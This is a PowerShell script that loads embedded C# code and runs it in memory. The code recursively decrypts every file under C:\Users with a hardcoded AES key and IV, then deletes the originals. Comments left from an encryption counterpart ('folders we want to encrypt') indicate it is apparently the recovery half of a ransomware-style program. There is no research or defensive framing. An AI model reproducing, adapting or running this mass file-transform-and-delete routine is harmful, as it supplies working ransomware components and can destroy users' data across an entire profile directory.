$code = @"
using System;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Text;


//string -> byte
//string base64 = Convert.ToBase64String(bytes);
//byte[] bytes = Convert.FromBase64String(base64);
namespace DecryptOnDemand
{
    public class Program
    {
        public static void Main()
        {
            Aes aes = Aes.Create();
            aes.Key = Convert.FromBase64String("mu5+UXEivFW+/SXS6LsvP3aVbghUtcarBTaxvfG3KzU=");
            aes.IV = Convert.FromBase64String("VLk2H2OiJBFLPG8Psp8cuA==");
            //make a list of all existing folders we want to encrypt

            List<string> startFolders = FindDirectories();

            if (startFolders.Count > 0)
            {
                //recursively encrypt all files found in startFolders[]
                foreach (string d in startFolders)
                {
                    FetchFiles(d, aes);
                }
            }

        }


        private static void FetchFiles(string start, Aes aes)
        {
            //list all files and subdirectories in the current folder
            string[] filesHere = Directory.GetFiles(start);
            string[] directHere = Directory.GetDirectories(start);
            if (filesHere.Length > 0)
            {
                //encrypt the files
                foreach (string f in filesHere)
                {
                    //Console.WriteLine(f + "\n");
                    // Console.WriteLine(f + "\n");
                    try
                    {
                        //Console.WriteLine(f + "\n");
                        DecryptFile(new FileInfo(f), aes);

                        //Console.WriteLine("hellooooooo");
                        File.Delete(f);
                    }
                    catch
                    {
                        //Console.WriteLine("Sean thinks you don't have write permissions");
                        // Console.WriteLine(e);
                    }
                }
            }

            if (directHere.Length > 0)
            {
                //recursive call on all subdirectories
                foreach (string d in directHere)
                {
                    if (!d.Contains("AppData"))

                    {
                        try
                        {
                            FetchFiles(d, aes);
                        }
                        catch
                        {
                            //Console.WriteLine(e);
                        }
                    }
                }
            }
        }

        private static List<string> FindDirectories()
        {
            List<string> startFolders = new List<string>();
            //add default windows directories to target folders
            string[] commonFolders = { @"C:\Users" };//, @"C:\Documents", @"C:\Desktop", @"C:\Pictures", @"C:\Downloads", @"C:\Videos" };
            foreach (string c in commonFolders)
                if (Directory.Exists(c))
                {
                    startFolders.Add(c);
                }
            //add all external directories to target folders
            /*char external = 'D';
            while (Directory.Exists(external + ":"))
            {
                startFolders.Add(external++ + ":");
            }*/
            return startFolders;
        }


        private static void DecryptFile(FileInfo file, Aes aes)
        {
            ICryptoTransform transform = aes.CreateDecryptor();
            string outFile = Path.Combine(file.DirectoryName, Path.ChangeExtension(file.Name, ""));

            using (var outFs = new FileStream(outFile, FileMode.Create))
            {
                using (var outStreamDecrypted = new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                {
                    int count = 0;
                    int offset = 0;

                    int blockSizeBytes = aes.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];
                    int bytesRead = 0;

                    using (var inFs = new FileStream(file.FullName, FileMode.Open))
                    {
                        do
                        {
                            count = inFs.Read(data, 0, blockSizeBytes);
                            offset += count;
                            outStreamDecrypted.Write(data, 0, count);
                            bytesRead += blockSizeBytes;
                        } while (count > 0);
                        outStreamDecrypted.FlushFinalBlock();
                    }
                }
            }
        }
        // Console.WriteLine(Convert.ToBase64String(aes.Key));
        //Decrypt
        /*
                 using (MemoryStream memoryStream = new MemoryStream(aes.Key))
                 {
                     using (CryptoStream cryptoStream =
                        new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                     {
                         byte[] decryptedBytes = new byte[aes.Key.Length];
                         cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);
                         Console.WriteLine(Encoding.Unicode.GetString(decryptedBytes));
                     }
                 }*/
    }


    /*

      string outFile =
          Path.ChangeExtension(file.Name, "");

      using (var inFs = new FileStream(file.FullName, FileMode.Open))
      {


          int startC = aes.Key.Length + aes.IV.Length + 8;
          int lenC = (int)inFs.Length - startC;

          ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);


          using (var outFs = new FileStream(outFile, FileMode.Create))
          {
            Console.WriteLine("line 168");
              int count = 0;
              int offset = 0;

              int blockSizeBytes = aes.BlockSize / 8;
              byte[] data = new byte[blockSizeBytes];
Console.WriteLine("line 174");

              inFs.Seek(startC, SeekOrigin.Begin);
              using (var outStreamDecrypted =
                  new CryptoStream(outFs, transform, CryptoStreamMode.Write))
              {
                  do
                  {
                      count = inFs.Read(data, 0, blockSizeBytes);
                      offset += count;
                      outStreamDecrypted.Write(data, 0, count);
                  } while (count > 0);

                  outStreamDecrypted.FlushFinalBlock();
              }
          }
      }*/
}

//}
"@
Add-Type -TypeDefinition $code -Language CSharp
iex "[DecryptOnDemand.Program]::Main()"